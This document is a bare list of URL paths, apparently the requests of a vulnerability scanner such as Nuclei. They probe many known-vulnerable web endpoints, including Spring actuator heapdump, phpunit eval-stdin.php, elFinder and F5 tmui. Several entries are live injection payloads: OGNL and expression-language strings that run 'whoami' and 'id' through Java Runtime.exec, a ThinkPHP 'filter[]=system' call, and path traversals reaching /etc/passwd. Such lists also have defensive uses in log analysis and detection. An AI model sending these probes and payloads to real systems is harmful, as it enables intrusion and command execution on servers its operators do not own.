_ignition/execute-solution
_search
./.
./.
./.
./bin/sh
./RestAPI/Connection
./RestAPI/LogonCustomization
.axiom/accounts/do.json
(download)/tmp/poc.txt
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
${@java.lang.Runtime@getRuntime().exec("id")}/
2Dlvws6y3Q5bV2IDeTXLweL1fWM.txt
2DlvwwLwT8NyOAjdGCmnxnbjeFq.php
2DlvwxnheXhGwpVN7rzuGAB3v15.txt
2DlvwzQDYFCnCUumFs02BQejDNq.txt
2Dlvx07lSyhdnJORMuEfNDeqE7d.php
about_state
account
account/index.php
account/register
actions/authenticate.php
actions/seomatic/meta-container/all-meta-containers
actions/seomatic/meta-container/meta-link-container/
actuator/env
actuator/gateway/refresh
actuator/gateway/routes/2Dlvx0BdHiFeaOKSwWfxZvjZXqw
actuator/heapdump
Admin
admin/auth/reset-password
admin/elfinder/elfinder-cke.html
admin/index.php
admin/user.php
aj.html
ajax/render/widget_tabbedcontainer_tab_panel
ajaxPages/writeBrowseFilePathAjax.php
analytics/telemetry/ph/api/hyper/send
api/2Dlvwsg0yGEa2xGNew5QWqz5sSz
api/console/api_server
api/edr/sangforinter/v2/cssp/slog_client
api/group/list
api/jsonws/invoke
api/ping
api/system/sessions
api/timelion/run
api/user/reg
apisix/batch-requests
apply_sec.cgi
assets/app/something/services/AppModule.class/
assets/backend/elfinder/elfinder-cke.html
assets/data/usrimg/2dlvxfzr9vnm1xue7307kkzqvp7.php
assets/elFinder-2.1.9/elfinder.html
assets/elFinder/elfinder.html
auth
auth/change
auth/newpassword
authenticationendpoint/2dlvwtoji2upjijemhgq2n1uhxc.jsp
autodiscover/autodiscover.json
Autodiscover/Autodiscover.xml
backend/elfinder/elfinder-cke.html
boaform/admin/formTracert
c42api/v3/LoginConfiguration
carbon/generic/save_artifact_ajaxprocessor.jsp
card_scan.php
catalog-portal/ui/oauth/verify
ccmadmin/j_security_check
cgi-bin/admin.cgi
cgi-bin/libagent.cgi
cgi-bin/login.cgi
cgi-bin/logo_extra_upload.cgi
cgi-bin/logoff.cgi
cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd
cgi-bin/mainfunction.cgi
cgi-bin/rpc
cgi-bin/slogin/login.py
cgi-bin/system_log.cgi
cgi-bin/system_mgr.cgi
cgi-bin/touchlist_sync.cgi
checkValid
CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
cobbler_api
concrete5/index.php/install
conf_mail.php
console/css/%2e%2e%2fconsole.portal
console/images/%2e%2e%2fconsole.portal
context.json
CTCWebService/CTCWebServiceBean/ConfigServlet
dashboard/proc.php
dashboardUser
db_dump.php
devices.inc.php
dfsms/
directdata/direct/router
dr/authentication/oauth2/oauth2login
dumpmdm.cmd
EemAdminService/EemAdmin
elfinder/elfinder-cke.html
en/php/usb_sync.php
esp/cms_changeDeviceContext.esp
etc/passwd
fileupload/toolsAny
fuel/pages/select/
functionRouter
fw.login.php
GallerySite/filesrc/fotoilan/388/middle//.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
getFavicon
glpi/scripts/unlock_tasks.php
goform/setmac
goform/setSysAdm
GponForm/diag_Form
guest_auth/guestIsUp.php
guest_auth/poc.php
heapdump
help/admin-guide/test.jsp
horde/admin/user.php
hsqldb
http/index.php
i3geo/exemplos/codemirror.php
images/../info.html
images/icons_title.gif
images/json
imc/javax.faces.resource/dynamiccontent.properties.xhtml
include/makecvs.php
index.php
index.php/catalogsearch/advanced/result/
index.php/install
integration/saveGangster.action
invoker/EJBInvokerServlet/
invoker/JMXInvokerServlet/
ipython/tree
ispirit/interface/gateway.php
j_security_check
jars/upload
javax.faces.resource/dynamiccontent.properties.xhtml
jbossass/jbossass.jsp
jexinv4/jexinv4.jsp
jexws/jexws.jsp
jexws4/jexws4.jsp
laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
lcms/index.php
lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
linuxki/experimental/vis/kivis.php
login
login.action
login.htm
logo/2Dlvwv9RIal5v1LhkiMdASPYNJU.txt
logupload
lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css
lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css
mailingupgrade.php
mainfile.php
manage/webshell/u
manager/radius/server_ping.php
mgmt/shared/authn/login
mifs/.;/services/LogService
mifs/j_spring_security_check
msa/main.xp
nacos/v1/auth/users
nette.micro/
nuclei.txt
objects/getImage.php
objects/getImageMP4.php
objects/getSpiritsFromVideo.php
objects/nuclei.txt
opensis/index.php
overview.asp
owa/auth/x.js
passport/index.php
password_change.cgi
PDC/ajaxreq.php
php/ping.php
plugin
plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php
plus/ajax_street.php
premise/front/getPingData
prweb/PRAuth/app/default/
q
qvisdvr/
rest/domains/list
rest/tinymce/1/macro/preview
rest/v1/AccountService/Accounts
RestAPI/ImportTechnicians
RPC2_Login
run
s=set&_method=__construct&method=*&filter[]=system
scgi-bin/platform.cgi
Schemas/${''.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
scripts/setup.php
scripts/unlock_tasks.php
SDK/webLanguage
service/extdirect
service/v1/service-details
session/create
showfile.php
solr/admin/collections
solr/admin/cores
storfs-asup
SWNetPerfMon.db.i18n.ashx
system/deviceInfo
system/sharedir.php
test.txt
tmui/locallb/workspace/fileSave.jsp
tmui/locallb/workspace/tmshCmd.jsp
tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp
tool/log/c.php
ui/api/v1/ui/auth/login
ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
ui/vcav-bootstrap/rest/vcav-providers/provider-logo
upgrade_handle.php
upload
upload/UploadResourcePic.ashx
uploads/assets/backend/elfinder/elfinder-cke.html
uploads/assets/backend/elfinder/elfinder.html
uploads/elfinder/elfinder-cke.html
user.action
user/register
user/scripts/login_par.js
userportal/Controller
users/sign_in
v1/2DlvwuuoS2Rvx7HT0GHiLimAhyK.php
v1/auth/users
v1/backend1
vcac/
vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
wavemaker/studioService.download
webadm/
webadmin/clientlogin/
webadmin/out
webadmin/tools/unixlogin.php
webGui/images/green-on.png/
websso/SAML2/SSO/vsphere.local
wp-admin/
wp-admin/admin-ajax.php
wp-content/plugins/contact-form-7/readme.txt
wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php
wp-content/plugins/wechat-broadcast/wechat/Image.php
wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/2DlvwwcEjTZN9y81z9MguYl3bBR.txt
wp-json/wc/store/products/collection-data
wp-login.php
ws_utc/resources/setting/keystore
ws_utc/resources/setting/options
wsman
x
yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
ztp/cgi-bin/handler